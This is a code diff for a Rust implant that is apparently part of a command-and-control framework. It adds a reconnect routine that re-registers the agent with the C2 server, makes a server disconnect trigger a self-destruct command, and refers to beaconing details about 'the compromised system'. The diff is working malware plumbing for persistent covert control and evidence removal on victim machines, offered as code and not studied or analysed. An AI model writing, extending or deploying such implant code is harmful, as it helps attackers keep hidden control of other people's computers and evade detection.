@@ -118,11 +118,12 @@ pub async fn heartbeat(
         })) => {
             logger.log("[*] Received disconnect from C2");
             //println!("[*] Received disconnect from C2");
-            return None
+            return Some(vec![AgentCommand::SelfDestruct])
         }
         Ok(Some(msg)) => {
             logger.error(&format!("[!] Unexpected message: {:?}", msg));
             //eprintln!("[!] Unexpected message: {:?}", msg);
+            return Some(vec![AgentCommand::InvalidTask])
         }
         Err(e) => {
             logger.error(&format!("[!] Beacon attempt failed: {}", e));
@@ -132,6 +133,36 @@ pub async fn heartbeat(
     }
 
     return None
+}
+
+pub async fn reconnect(addr: &str, agent_id: u64, session_id: &str, timeout: u64, logger: &Logger) -> (u64, String) {
+    let reconnect = AgentMessage::Reconnect {
+        agent_id,
+        session_id: session_id.to_string()
+      };
+
+    match send_message(addr, reconnect.clone(), timeout).await {
+        Ok(Some(ServerMessage::Ack {
+            agent_id,
+            status,
+            session_id,
+        })) => {
+            logger.log(&format!("[*] Received Ack from server (status: {})", status));
+            return (agent_id, session_id);
+        }
+        Ok(Some(msg)) => {
+            logger.error(&format!("[!] Unexpected message: {:?}", msg));
+            return (0, "NONE".to_string());
+        }
+        Err(e) => {
+            logger.error(&format!("[!] Reconnect attempt failed: {}", e));
+        }
+        _ => {}
+    }
+
+
+    logger.error("[!] Failed to reconnect. Continuing to operate offline.");
+    (0, "NONE".to_string())
 }
 
 /// Constructs an `AgentMessage::Beacon` variant containing information about the compromised system,
